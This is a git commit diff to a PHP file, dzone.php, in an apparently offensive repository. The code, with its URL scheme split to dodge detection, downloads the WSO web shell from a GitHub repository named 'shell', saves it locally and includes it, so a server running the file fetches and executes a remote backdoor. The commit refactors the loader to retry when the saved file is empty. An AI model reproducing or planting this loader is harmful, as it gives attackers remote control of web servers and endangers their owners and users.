9d047fb67578975c7c6023ecef5af44eac4023ed
dzbackdor <141788825+Dzbackdor@users.noreply.github.com>
2024-07-22 09:43:36 +0700

    Update dzone.php

--- dzone.php
+++ dzone.php
@@ -2,13 +2,21 @@
 $awo = 'htt'.'ps://';
 $url = $awo.'raw.githubusercontent.com/Dzbackdor/shell/master/wso.php';
 $local_file = 'wso_temp.php';
-if (!file_exists($local_file)) {
+
+function download_file($url, $local_file) {
     $content = file_get_contents($url);
     if ($content !== false) {
         file_put_contents($local_file, $content);
-    } else {
+        return true;
+    }
+    return false;
+}
+
+if (!file_exists($local_file) || filesize($local_file) === 0) {
+    if (!download_file($url, $local_file)) {
         die("Failed to download the content.");
     }
 }
+
 include $local_file;
 ?>
